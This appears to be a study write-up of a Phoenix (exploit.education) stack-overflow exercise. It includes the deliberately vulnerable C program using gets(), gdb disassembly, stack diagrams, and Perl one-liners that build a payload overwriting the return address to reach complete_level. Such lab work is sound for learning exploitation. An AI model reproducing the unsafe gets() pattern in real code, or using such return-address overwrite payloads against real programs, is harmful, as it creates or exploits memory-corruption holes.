In this exercise we will try to overwrite the return address
with `<complete_level>`.

#Source code

```C
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

#Walkthrough

Ok, in this exercise, we need to pay much closer attention to the assembly, and
to the memory layout. In particular, we need to recall what happens when `start_level`
returns. (Connecting to the basics of function calls.)

In `gdb`, we run

```
(gdb) b start_level
(gdb) r
(gdb) layout asm
```

from which we obtain (here we use Intel notation)

```asm
push rbp
mov rbp,rsp
sub rsp,0x50 ; allocate space for 80 bytes
lea rax, [rbp-0x50]
mov rdi, rax
call <gets@plt>
mov rax, QWORD PTR [rbp+0x8]
mov QWORD PTR [rbp-0x8], rax
mov rsi, rax
mov edi, 0x400733
mov eax, 0x0
call <printf@plt>
nop
leave
ret
```

Hmm, we allocate 80 bytes, but we seem to only need 64+8=72 bytes. Maybe it's
an alignment thing? This can be found out of course. We put some stuff on the
stack. First:

```
$ perl -e 'print "A"x64,"BBBB","CCCC"' > overflow1
```

Then in `gdb`:

```
(gdb) b start_level
(gdb) r < /path/to/overflow
```

We find that the stack is the following, right after `leave` and before `ret`:

```
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       B B B B C C C C <- 72 bytes until here
       ret
       old rbp
rsp -> return address
```

So, the following payload should do the trick

```
$ perl -e 'print "A"x88,"\x1d\x06\x40\x00\x00\x00\x00\x00"' > overflow2
```

We try this out as above -- and indeed, we step into `complete_level`. Let's
try it without `gdb` then.

```
$ ./program < overflow2
```

We get our congratulations! Neat.

## An aside

Seyfarth mentions "be sure to subtract a multiple of 16 bytes to avoid possible
problems with stack alignment". This is precisely why we get a gap in the stack.
That is, if we don't overflow, then the memory looks like this:

```
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A
       A A A A A A A A <- 64 bytes until here
       NULL            
       ret
       old rbp
rsp -> return address
```

We need 72 bytes, but 72/16=9/2, so we get a poorly aligned stack if we subtract
72. The next multiple of 16 is 80, which explains why the compiler
chose `sub rsp, 0x50`.
